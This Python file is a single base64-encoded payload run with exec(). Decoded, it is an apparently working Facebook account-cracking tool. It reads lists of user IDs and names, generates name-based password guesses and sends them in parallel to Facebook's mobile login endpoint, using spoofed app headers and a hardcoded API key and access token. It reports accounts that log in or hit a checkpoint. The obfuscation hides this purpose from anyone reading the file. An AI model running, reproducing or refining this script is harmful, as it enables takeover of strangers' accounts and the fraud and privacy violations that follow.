import base64
exec(base64.b64decode(b'Iy0tLS0tLS0tLS1pbXBvcnQtLS0tLS0tLS0tIwppbXBvcnQgb3MKZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyBzbHAKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyB0ZWQKaW1wb3J0IHV1aWQKaW1wb3J0IHJhbmRvbSAKaW1wb3J0IGh0dHB4CmltcG9ydCBqc29uCmltcG9ydCBzeXMKIy0tLS0tLS0tLS1sb2dvLS0tLS0tLS0tLSMKbG9nbz0oJycnICAgICAgICAgICAgICAgICAgICAgICAKXDAzM1sxOzMybSAKIFwwMzNbMTszMm0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKXHgxYlsxOzkxbSAgICAgICAgICAgICAgICAgICApICAgICAgICAgICAgICAgICAgClx4MWJbMTs5MW0gICggICAgICggICAgICAgKCAvKCAgICAgICAgICAgICggICAgIApceDFiWzE7OTFtICApXCAgICkpXCAgKCAgIClcKCkpICggICAgICggICApXCApICAKXHgxYlsxOzkxbSAoKF8pIC8oKF8pIClcIChfKSkvICApXCApICApXCAoKCkvKCAgClx4MWJbMTs5MW0gICAhIChfKSkoICgoXyl8IHxfICBfKF8vKCAoKF8pICkoXykpIApceDFiWzE7OTFtICB8IHx8IHx8IHwoXy08fCAgX3x8ICcgXCkpKF8tPHwgfHwgfCAKXHgxYlsxOzkxbSBfLyB8IFxfLF98L19fLyBcX198fF98fF98IC9fXy8gXF8sIHwgClx4MWJbMTs5MW18X18vICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfXy8gIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAK4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiXDAzM1sxOzMzbQogIFx4MWJbMTs5MW1BdXRob3IgIDoganVzdGluZSBzeQogIFx4MWJbMTs5MW1GYWNlYm9vayA6IGp1c3RpbmUuc3l4ZApceDFiWzE7OTFt4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiXDAzM1sxOzMybSAnJycpCiMtLS0tLS0tLS0tY2xlYXItLS0tLS0tLS0tIwpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQobG9nbykKICAgIHByaW50KDUwKictJykKICAgIHByaW50KCcgVG9vbCAgIDogRklMRSBDTE9OSU5HL0ZBQ0VCT09LIENSQUNLSU5HJykKICAgIHByaW50KCcgVmVyc2lvbjogMS4wJykKICAgIHByaW50KDUwKictJykKIy0tLS0tLS0tLS1saW5lLS0tLS0tLS0tLSMKZGVmIGxpbmUoKToKICAgIHByaW50KDUwKictJykKIy0tLS0tLS0tLS1tZW51LS0tLS0tLS0tLSMKZGVmIG1haW4oKToKICAgIGNsZWFyKCkKICAgIHByaW50KCcgXHgxYlsxOzkybVsxXSBGSUxFIENMT05JTkcgJykKICAgIHByaW50KCcgXHgxYlsxOzkybVsyXSBFWElUICcpCiAgICBsaW5lKCkKICAgIG9wdGlvbj1pbnB1dCgnXHgxYlsxOzkybSBDSE9JQ0UgOiAnKQogICAgaWYgb3B0aW9uIGluIFsnMDEnLCcxJ106CiAgICAgICAgX19maWxlX18oKQogICAgZWxzZToKICAgICAgICBleGl0KCcgVEhBTktTIEZPUiBVU0lORyAnKQojLS0tLS0tLS0tLWZpbGUtLS0tLS0tLS0tIwpkZWYgX19maWxlX18oKToKICAgIGNsZWFyKCkKICAgIGZpbGV4PWlucHV0KCcgRU5URVIgRklMRSBQQVRIIDogJykKICAgIHRyeToKICAgICAgICBmbz1vcGVuKGZpbGV4LCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCcgRmlsZSBub3QgZm91bmQgISEnKTtzbHAoMikKICAgICAgICBfX2ZpbGVfXygpCiAgICBjbGVhcigpCiAgICB0cnk6CiAgICAgICAgcGFzX2xpbWl0PWludChpbnB1dCgnIEVOVEVSIFBBU1NXT1JEIExJTUlUICgyMCBNQVgpIDogJykpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzX2xpbWl0PTEKICAgIGxpbmUoKQogICAgcGFzX2xpc3Q9W10KICAgIGZvciBpIGluIHJhbmdlKHBhc19saW1pdCk6CiAgICAgICAgcGFzeD1pbnB1dChmJyBFTlRFUiBQQVNTV09SRCB7aSsxfSA6ICcpCiAgICAgICAgcGFzX2xpc3QuYXBwZW5kKHBhc3gpCiAgICB3aXRoIHRlZChtYXhfd29ya2Vycz0zMCkgYXMgRGlwdG86CiAgICAgICAgdGw9c3RyKGxlbihmbykpCiAgICAgICAgY2xlYXIoKQogICAgICAgIHByaW50KCcgQUxMIEFDQ09VTlRTOiAnK3RsKQogICAgICAgIHByaW50KCcgT04vT0ZGIEFJUlBMQU5FIE1PREUgRk9SIEJFVFRFUiBSRVNVTFQnKQogICAgICAgIGxpbmUoKQogICAgICAgIGZvciB1c2VyIGluIGZvOgogICAgICAgICAgICBpZHMsbmFtZXM9dXNlci5zcGxpdCgnfCcpCiAgICAgICAgICAgIHBhc3NsaXN0PXBhc19saXN0CiAgICAgICAgICAgIERpcHRvLnN1Ym1pdChtMSxpZHMsbmFtZXMscGFzc2xpc3QpCiAgICBsaW5lKCkKICAgIHByaW50KCcgVEhFIFBST0NFU1MgSEFTIEJFRU4gQ09NUExFVEUnKQogICAgaW5wdXQoJyBQUkVTUyBFTlRFUiBUTyBCQUNLIDogJykKICAgIG1haW4oKQpsb29wPTAKb2tzPVtdCmNwcz1bXQojLS0tLS0tLS0tLW1ldGhvZC0tLS0tLS0tLS0tLSMKZGVmIG0xKGlkcyxuYW1lcyxwYXNzbGlzdCk6CiAgICBnbG9iYWwgb2tzLGxvb3AKICAgIHRyeToKICAgICAgICBmbj1uYW1lcy5zcGxpdCgnICcpWzBdCiAgICAgICAgdHJ5OgogICAgICAgICAgICBsbj1uYW1lcy5zcGxpdCgnICcpWzFdCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBsbj1mbgogICAgICAgIGZvciBwdyBpbiBwYXNzbGlzdDoKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHJcclwwMzNbMTszMm0gW0NSQUNLSU5HXSAlc3xBTElWRTolcyAnJShsb29wLGxlbihva3MpKSk7c3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIHBhcz1wdy5yZXBsYWNlKCdmaXJzdCcsZm4ubG93ZXIoKSkucmVwbGFjZSgnRmlyc3QnLGZuKS5yZXBsYWNlKCdsYXN0Jyxsbi5sb3dlcigpKS5yZXBsYWNlKCdMYXN0JyxsbikucmVwbGFjZSgnTmFtZScsbmFtZXMpLnJlcGxhY2UoJ25hbWUnLG5hbWVzLmxvd2VyKCkpCiAgICAgICAgICAgIGRhdGE9eydhZGlkJzogc3RyKHV1aWQudXVpZDQoKSksICdmb3JtYXQnOiAnanNvbicsICdkZXZpY2VfaWQnOiBzdHIodXVpZC51dWlkNCgpKSwgJ2VtYWlsJzogaWRzLCAncGFzc3dvcmQnOiBwYXMsICdnZW5lcmF0ZV9hbmFseXRpY3NfY2xhaW1zJzogJzEnLCAnY29tbXVuaXR5X2lkJzogJycsICdjcGwnOiAndHJ1ZScsICd0cnlfbnVtJzogJzEnLCAnZmFtaWx5X2RldmljZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpLCAnY3JlZGVudGlhbHNfdHlwZSc6ICdwYXNzd29yZCcsICdzb3VyY2UnOiAnbG9naW4nLCAnZXJyb3JfZGV0YWlsX3R5cGUnOiAnYnV0dG9uX3dpdGhfZGlzYWJsZWQnLCAnZW5yb2xsX21pc2F1dGgnOiAnZmFsc2UnLCAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLCAnZ2VuZXJhdGVfbWFjaGluZV9pZCc6ICcxJywgJ2N1cnJlbnRseV9sb2dnZWRfaW5fdXNlcmlkJzogJzAnLCAnbG9jYWxlJzogJ2VuX1VTJywgJ2NsaWVudF9jb3VudHJ5X2NvZGUnOiAnVVMnLCAnZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lJzogJ2F1dGhlbnRpY2F0ZScsICdhcGlfa2V5JzogJzg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkJywgJ2FjY2Vzc190b2tlbic6ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInfQogICAgICAgICAgICBoZWFkPXsKICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCAxMTsgNDNGU0EgQnVpbGQvUlRNNS4yMjA2MDkuMTk0KSBbRkJBTi9GQjRBO0ZCQVYvMTUuMC4wLjkxMjtGQkJWLzM4MDAxMjU7W0ZCQU4vRkI0QTtGQkFWLzI4MC4wLjAuNDguMTIyO0ZCQlYvMjMzMjM1MjQ3O0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMzJ9O0ZCTEMvZW5fVVM7RkJSVi8yMzU0MTIwMjA7RkJDUi9haXJ0ZWw7RkJNRi9PUFBPO0ZCQkQvT1BQTztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9DUEgxODkzO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO10nLCAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLCAnQWNjZXB0JzogJyovKicsICdDb25uZWN0aW9uJzogJ2Nsb3NlJywgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLCAnSG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nLCAnWC1GQi1OZXQtSE5JJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLDQwMDAwKSksICdYLUZCLVNJTS1ITkknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsNDAwMDApKSwgJ0F1dGhvcml6YXRpb24nOiAnT0F1dGggMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywgJ1gtRkItQ29ubmVjdGlvbi1UeXBlJzogJ0xURScsICdYLVRpZ29uLUlzLVJldHJ5JzogJ0ZhbHNlJywgJ3gtZmItc2Vzc2lvbi1pZCc6ICduaWQ9amlaK3lOTkJnYndDO3BpZD1NYWluO3RpZD0xMzI7bmM9MTtmYz0wO2JjPTA7Y2lkPTYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywgJ3gtZmItZGV2aWNlLWdyb3VwJzogc3RyKHJhbmRvbS5yYW5kaW50KDEwMDAsOTk5OSkpLCAnWC1GQi1GcmllbmRseS1OYW1lJzogJ1ZpZXdlclJlYWN0aW9uc011dGF0aW9uJywgJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6ICdncmFwaHNlcnZpY2UnLCAnWC1GQi1IVFRQLUVuZ2luZSc6ICdMaWdlcicsICdYLUZCLUNsaWVudC1JUCc6ICdUcnVlJywgJ1gtRkItU2VydmVyLUNsdXN0ZXInOiAnVHJ1ZScsICd4LWZiLWNvbm5lY3Rpb24tdG9rZW4nOiAnZDI5ZDY3ZDM3ZWNhMzg3NDgyYThhNWI3NDBmODRmNjInfQogICAgICAgICAgICB1cmw9J2h0dHBzOi8vYi1ncmFwaC5mYWNlYm9vay5jb20vYXV0aC9sb2dpbicKICAgICAgICAgICAgcmVxPWh0dHB4LnBvc3QodXJsLGRhdGE9ZGF0YSxoZWFkZXJzPWhlYWQpLmpzb24oKQogICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHJlcToKICAgICAgICAgICAgICAgIHByaW50KCdcclxyIFtPS10gJytpZHMrJ3wnK3BhcykKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoaWRzKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVxWydlcnJvciddWydtZXNzYWdlJ106CiAgICAgICAgICAgICAgICBwcmludCgnXHJcciBbQ1BdICcraWRzKyd8JytwYXMpCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGlkcykKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIGxvb3ArPTEKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiMtLS0tLS0tLS0tZW5kLS0tLS0tLS0tLSMKbWFpbigpCg=='))